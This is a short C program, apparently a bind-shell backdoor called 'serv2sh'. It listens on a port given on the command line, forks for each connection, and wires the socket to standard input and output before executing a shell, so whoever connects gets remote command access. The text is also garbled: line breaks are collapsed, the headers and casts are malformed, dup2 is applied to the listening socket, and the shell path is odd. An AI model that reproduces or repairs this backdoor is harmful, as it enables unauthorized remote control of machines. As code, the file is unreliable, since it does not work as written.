#include <stdio.h>#include <net.h>#include <signal.h>char buffer[512];#define SERVERIP "0.0.0.0"int pid;int main(argc, argv)int argc;char **argv;{    int sfdn, i=0, dcount =0, clientlen;    struct sockaddr_in server;    struct sockaddr_in client;    int count = 0;    if (argc < 2)    {        fprintf(stderr,"usage: serv2sh <port>\n");        exit (1);    }    while(1)    {        if ((pid = fork()) == 0)        /* child */        {            sfdn = socket(AF_INET, SOCK_STREAM|SOCK_SIGPIPECLS,0);            bzero(&server, sizeof(struct server));            server.sin_family = AF_INET;            server.sin_port = atoi (argv[1]);            server.sin_addr = (uint32_t) inet_addr(SERVERIP) ;            i = bind(sfdn,(struct sockaddrin*) &server, sizeof(server));            if (i == -1)            {                printf ("Bind error!\n");                exit(1);            }            listen(sfdn,1);            accept(sfdn,(struct sockaddr_in*)&client, &clientlen);            nice(-5);            dup2(sfdn, 0);            dup2(sfdn, 1);            dup2(sfdn, 2);            close (3);            execl("/bin/shellnot", "+shell", 0);        }        else        { /* parent */            while(wait() != pid);        }    }}